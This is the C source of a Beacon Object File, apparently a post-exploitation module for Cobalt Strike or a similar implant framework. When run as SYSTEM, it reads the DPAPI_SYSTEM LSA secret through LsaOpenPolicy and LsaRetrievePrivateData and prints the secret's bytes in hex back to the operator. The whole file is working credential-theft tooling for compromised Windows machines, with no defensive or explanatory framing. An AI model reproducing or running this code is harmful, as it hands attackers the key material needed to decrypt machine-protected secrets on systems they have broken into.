/*
 * dpapissystem - read the DPAPI_SYSTEM LSA secret (SYSTEM only).
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"

static void init_us(LSA_UNICODE_STRING *us, const wchar_t *s)
{
    int n = bof_wcslen(s);
    us->Buffer = (PWSTR)s;
    us->Length = (USHORT)(n * sizeof(WCHAR));
    us->MaximumLength = (USHORT)((n + 1) * sizeof(WCHAR));
}

void go(char *args, int alen)
{
    LSA_OBJECT_ATTRIBUTES oa;
    LSA_HANDLE pol = NULL;
    LSA_UNICODE_STRING key, *data = NULL;
    NTSTATUS st;
    DWORD i;

    (void)args; (void)alen;
    bof_memzero(&oa, sizeof(oa));

    st = ADVAPI32$LsaOpenPolicy(NULL, &oa, POLICY_GET_PRIVATE_INFORMATION, &pol);
    if (st != 0) {
        BeaconPrintf(CALLBACK_ERROR, "LsaOpenPolicy failed: 0x%08lx\n", (unsigned long)st);
        return;
    }

    init_us(&key, L"DPAPI_SYSTEM");
    st = ADVAPI32$LsaRetrievePrivateData(pol, &key, &data);
    if (st != 0 || !data) {
        BeaconPrintf(CALLBACK_ERROR, "LsaRetrievePrivateData failed: 0x%08lx (need SYSTEM)\n",
                     (unsigned long)st);
        ADVAPI32$LsaClose(pol);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "DPAPI_SYSTEM (%u bytes)\n", (unsigned)data->Length);
    for (i = 0; i < data->Length; i++) {
        BeaconPrintf(CALLBACK_OUTPUT, "%02x", ((unsigned char *)data->Buffer)[i]);
    }
    BeaconPrintf(CALLBACK_OUTPUT, "\n");

    ADVAPI32$LsaFreeMemory(data);
    ADVAPI32$LsaClose(pol);
}
